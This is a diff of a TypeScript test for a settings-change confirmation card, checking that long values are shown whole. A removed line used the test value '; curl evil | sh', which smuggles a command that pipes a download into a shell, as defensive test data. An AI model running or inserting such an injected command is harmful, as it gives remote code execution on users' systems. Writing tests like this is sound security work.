@@ -361,8 +361,14 @@ describe("setting_change fails closed: every key it takes is placed (issue 1371)
 
 describe("setting_change: the card shows exactly what is written (issue 1371)", () => {
   it("a long value is shown whole on the card, never cut", () => {
-    const value = `code ${"a".repeat(250)} ; curl evil | sh`;
-    const c = checkSettingChange(deps(), { key: "editor", value, reason: "r" });
+    // Issue 1391: editor now takes only an editor Den knows, so a long
+    // reference stands in: still a widening key, shown whole.
+    const value = `op://Private/${"a".repeat(250)}/field`;
+    const c = checkSettingChange(deps(), {
+      key: "secrets.refs.sudo",
+      value,
+      reason: "r",
+    });
     if (!c.ok) throw new Error(c.error);
     expect(c.personOnly).toBe(true);
     expect(c.details).toContain(`New: ${value}`);
